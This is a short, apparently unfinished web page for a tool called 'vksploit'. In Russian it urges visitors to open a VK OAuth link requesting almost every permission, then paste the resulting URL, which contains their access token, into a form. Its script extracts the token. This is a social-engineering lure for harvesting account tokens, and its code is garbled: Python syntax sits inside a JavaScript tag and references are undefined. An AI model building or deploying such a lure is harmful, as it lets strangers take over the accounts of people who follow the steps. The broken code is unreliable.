<div id="main">
enable javascript support
</div>
<script>
main=document.getElementById("main")
def show(q):
 main.innerHTML=q
token=localStorage['t']
if token==null:
 show('''Станьте больше, чем просто пользователь с использованием vksploit
откройте <a target="_blank" href="https://oauth.vk.com/authorize?client_id=2685278&scope=1073737727&redirect_uri=https://oauth.vk.com/blank.html&display=page&response_type=token&revoke=1">страницу регистрации<a/>
предоставьме все разрешения
скопируйте url в поле ниже
<form>
<input id="reg_token" type="text">
</form>
''')
def reg_token_h():
 token=urltoken.value
 acc=token.indexOf('access_token=')
 if acc>-1:
  oth=token.indexOf('&',acc)
  token=token.slice(acc+13,oth)
  alert(token)
reg_token.onclick=reg_token_h()
</script>
